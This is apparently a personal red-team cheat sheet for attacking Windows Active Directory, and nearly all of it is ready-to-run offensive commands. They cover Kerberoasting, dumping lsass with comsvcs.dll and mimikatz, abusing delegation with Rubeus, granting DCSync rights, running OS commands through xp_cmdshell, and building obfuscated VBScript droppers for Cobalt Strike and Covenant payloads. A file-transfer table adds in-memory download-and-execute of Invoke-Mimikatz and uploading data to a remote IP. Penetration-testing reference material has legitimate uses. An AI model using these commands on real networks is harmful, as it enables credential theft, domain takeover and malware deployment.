# Arsenals

This is my personal safe for arsenals. Feel free to refer and use at anytime. You can also refer to this [arsenals](arsenals) for any extra commands (`Ctrl+f` will definitely help)

**_Disclaimer: Do not use this command for illegal use. Any action you take upon the information on this repo is strictly at your own risk_**

* **[ACLs/ACEs permissions](#acls-possible-abuse)**
* **Enumeration**
	* **[Domain Enumeration](#powerview-enumeration)**
		* [ASREP Roasting](#asrep-roasting)
		* [Kerberoasting](#kerberoasting)
	* **[Constrained Language Mode](#constrained-language-mode)**
		* [CLM Enumeration](#clm-enumeration)
		* [Dump lsass with rundll32(signed binary](#dump-lsass-process-with-signed-binary)
	* **[Foreign Principals](#foreign-principals)**
* **Delegation**
	* [Unconstrained Delegation](#unconstrained-delegation)
		* [Printer Bug](#printer-bug)
		* [Extract TGTs](#extract-tgt)
	* [Constrained Delegation](#constrained-delegation)
		* [s4u Delegation](#s4u-delegation)
	* [Resource-Based Constrained Delegation](#resource-based-constrained-delegation)
* **[ACLs/ACEs Abuse](#acls/aces-abuse)**
	* [ForceChangeUserPassword](#force-change-user-password)
	* [Targeted Kerberoast](#targeted-kerberoast)
	* [Add DCsync privilege to object](#add-dcsync-to-object)
	* [Add Users to Group](#add-users-to-group)
* **[SQL Server Enumeration and Code Execution (PowerUpSQL)](#sql-server-enumeration-and-code-execution)**
	* [Get SQL Instances](#get-sql-instances)
	* [Get SQL Linked Server](#get-sql-linked-server)
	* [Execute SQL Query and OS Command](#execute-sql-query-and-os-command)
* **[Generate VBScript dropper (APC process injection)](#generate-vbscript-dropper-apc-process-injection)**
	* [Cobalt Strike Beacon](#cobalt-strike-beacon)
	* [Covenant Grunt](#convenant-grunt)
* **[File Transfer](#file-transfer)**

## ACLs possible abuse
ACL/ACE | Permission | Abuse
--- | --- | ---
**GenericAll** | full rights to user/computer object | [Force change user's password](#force-change-user-password)
**GenericWrite** | Write/update object's attributes | [RBCD](#resource-based-constrained-delegation), [Targeted Kerberoast](#targeted-kerberoast), [Force change user's password](#force-change-user-password)
**WriteDACL** | modify object's ACE (full control) | [Give owned users DCsync Privilege](#add-dcsync-to-object)
**Self-Membership** | ability to add ourself to a group | [Add owned users to other group](#add-users-to-group)

## Domain Enumeration
### Forest Trust
```
# Map all domain trusts
Get-DomainTrustMapping -Verbose

# Get Forest Trust from current domain
Get-DomainTrust
```
### ASREP Roasting
```
Get-DomainUser -PreauthNotRequired
```
### Kerberoasting
```
# Powerview
Get-DomainUser -SPN

# Rubeus
Rubeus.exe kerberoast /nowrap
```
### Foreign Principals
Foreign principal means other user(s) from trusted domain that have access to current domain
```
# Get foreign user principals
Find-ForeignUser

# Get foreign group principals
Find-ForeignGroup
```

## Constrained Language Mode (CLM) / WDAC / Device Guard
### CLM Enumeration
```
$ExecutionContext.SessionState.LanguageMode
```
### View AppLocker Rules
```
Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections
```
### Dump lsass process with signed binary
This method will bypass CLM to dump lsass since we are using MS signed binary (whitelisted)
```
# Run this in victim/remote computer
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\Windows\Tasks\lsass.dmp full

# Use mimikatz's minidump 
mimikatz# sekurlsa::minidump <Path_to_file>\lsass.dmp
mimikatz# sekurlsa::logonpasswords
```

## Unconstrained Delegation
### Printer Bug
Using spooler service to authenticate between domain computers(that runs spooler svc). Attackers can monitor incoming tickets with `Rubeus`.
```
# run this on domain joined computers
spoolsample.exe dc01.contoso.local ms01.contoso.local

# monitor ticket
Rubeus.exe monitor /interval:5
```

### Extract TGT
Since unconstrained computers will save users tgt (logged in users). We will extract this keys and able to impersonate them.
```
mimikatz# sekurlsa::tickets /export
Rubeus.exe ptt /ticket:ticket.kirbi
```

## Constrained Delegation
### s4u delegation
This attack is possible if _msds-AllowedToDelegateTo_ is set. 
* with rc4 hash in hand
```
# Request TGT + TGS
Rubeus.exe s4u /user:attacker /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:time/dc01 /altservice:cifs,host,http /domain:contoso.local /dc:dc01.contoso.local /ptt
```
* with owned user session (not knowing his rc4)
```
# Request for ticket
Rubeus.exe tgtdeleg /nowrap

# Request TGS with base64 blob ticket
Rubeus.exe s4u /user:attacker /ticket:<base64-blob> /impersonateuser:administrator /msdsspn:time/dc01 /altservice:cifs,http,host /domain:contoso.local /dc:dc01.contoso.local /ptt
```

## Resource-Based Constrained Delegation
This attack is possible if owned user/computer object has _GenericWrite_ or write privilege to user/computer object attributes. Since we have write privilege, we can write to _msds-allowedtoactonbehalfofotheridentity_ property.
1. Import ADModule
2. Set _msds-allowedtoactonbehalfofotheridentity_ to owned computer/user objects. 
```
Set-ADComputer -Identity dc01 -PrincipalsAllowedToDelegateToAccount (Get-ADComputer mycomputer)
```
3. Get mycomputer$ ntlm hash or aes keys
```
mimikatz# sekurlsa::logonpasswords
```
4. Apply s4u delegation (TGT+TGS)
```
Rubeus.exe s4u /user:mycomputer$ /rc4:<rc4/ntlm hash> /impersonateuser:administrator /msdsspn:http/dc01 /altservice:cifs /ptt
```

## ACLs/ACEs Abuse
### Force Change User Password
```
Set-DomainUserPassword -Identity studentadmin -AccountPassword (ConvertTo-SecureString -AsPlainText -Force 'P@$$w0rd!')
```
### Add Users to Group
```
Add-DomainGroupMember -Identity studentadmins -Members studentuser
```
### Targeted Kerberoast
```
# Set SPN
Set-DomainObject -Identity sqlsvc -Set @{serviceprincipalname='my\sqlspn'}

# Clear SPN (OPSEC)
Set-DomainObject -Identity sqlsvc -Clear serviceprincipalname
```
### Add DCSync Privilege to object
```
Add-DomainObjectAcl -TargetIdentity "DC=contoso,DC=local" -PrincipalIdentity studentuser -Rights DCSync
```

## SQL Server Enumeration and Code Execution
I did most of my SQL Server Enumeration by using this [PowerUpSQL.ps1](https://github.com/NetSPI/PowerUpSQL) script. Refer to more commands in this [PowerUpSQL Cheatsheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
### Get SQL Instances
This method will allow you to enumerate local or domain sql servers(if any).
```
# Get Local Instance
Get-SQLInstanceLocal -Verbose

# Get Domain Instance
Get-SQLInstanceDomain -Verbose
```
### Get SQL Linked Server
This command will allow you to enumerate linked sql server to selected instance. Output of the command also shows privilege that you currently have on specific sql server
```
# Enumerate Linked Server (show just instace and priv)
Get-SQLServerLinkCrawl -Instance mssql-srv.contoso.local

# Enumerate Linked Server and Execute SQL Query
Get-SQLServerLinkCrawl -Instance mssql-srv.contoso.local -Query 'exec master..xp_cmdshell ''whoami'''
```
### Execute Remote SQLQuery
_Prerequisite:_
* Make sure you are **sa** user (high privileged user)
* Make sure to enable `xp_cmdshell` before executing os command
```
# Enable xp_cmdshell
Get-SQLQuery -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "DB-SQLSRV"'

# Execute OS command
Get-SQLQuery -Query 'EXECUTE(''xp_cmdshell ''''whoami'''''') AT "DB-SQLSRV"'
Invoke-SQLOSCmd -Instance DB-SQLSRV -Command "whoami"
```

## Generate VBScript dropper (APC process injection)
Make sure to download [GadgetToJScript](https://github.com/med0x2e/GadgetToJScript.git) and [Donut](https://github.com/TheWover/donut.git)._Note:This method probably won't 100% bypass EDR/AV._
### Cobalt Strike Beacon
For cobalt strike, this aggressor script called [**ShellCode Generator**](https://github.com/RCStep/CSSG) is very useful to generate shellcode with custom formatting. This cna also helps to obfuscate with XOR or AES method. 

1. Generate shellcode and this is my default configuration
![SG](src/images/shellcode_generator.png)

2. Use [this](https://gist.githubusercontent.com/3xpl01tc0d3r/ecf5e1ac09935c674a9c6939c694da13/raw/238ed3339a458ce0260f98dc18a38fdbed420457/Payload.txt) script and paste those hex bytes in `shellcode` variable
![b64var](src/images/b64var.png)

3. Compile with **GadgetToJScript**

```powershell
GadgetToJScript.exe -b -w vbs -o beacon -c .\real.cs
```

4. Execute with `wscript.exe beacon.cs`

### Covenant Grunt
For covenant, since its already has its built in .NET generator. You can use donut to further obfuscate the assembly/

1. Generate **binary** from Covenant
2. Obfuscate and convert to byte array with **Donut**. It will then generate into .bin file. 
```powershell
donut.exe -f .\Grunt.exe
```
3. Convert .bin file to base64 and save to clipboard
```powershell
# save filepath to a variable
$filename='<file-path-to>\payload.bin'
# Convert file to base64 and save to clipboard
[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename) | Clip
```
4. Download [this](https://gist.githubusercontent.com/3xpl01tc0d3r/ecf5e1ac09935c674a9c6939c694da13/raw/238ed3339a458ce0260f98dc18a38fdbed420457/Payload.txt) script, save as payload.cs (or anythin bcs no one cares) and replace the `b64` variable with our current clipboard
5. Convert payload.cs to vbs with **GadgetToJScript**
```powershell
.\GadgetToJScript.exe -b -w vbs -o realtest -c .\real.cs
```
6. Execute on remote computer 
```powershell
wscript.exe .\realtest.vbs
```
## Extra Red Teaming Tools (that i know of xD)
[MacroPack](https://github.com/sevagas/macro_pack) - Generate obfuscated Office Macro
[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) - Check for signature based detection, this support AMSI check as well
[ADConnect Dump](https://github.com/fox-it/adconnectdump) - Dumps Azure On-Prem ADConnect

## File Transfer

| **Command** | **Description** |
| --------------|-------------------|
| `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1` | Download a file with PowerShell |
| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`  | Execute a file in memory using PowerShell |
| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64` | Upload a file with PowerShell |
| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe` | Download a file using Bitsadmin |
| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe` | Download a file using Certutil |
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh` | Download a file using Wget |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh` | Download a file using cURL |
| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'` | Download a file using PHP |
| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip` | Upload a file using SCP |
| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` | Download a file using SCP |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |
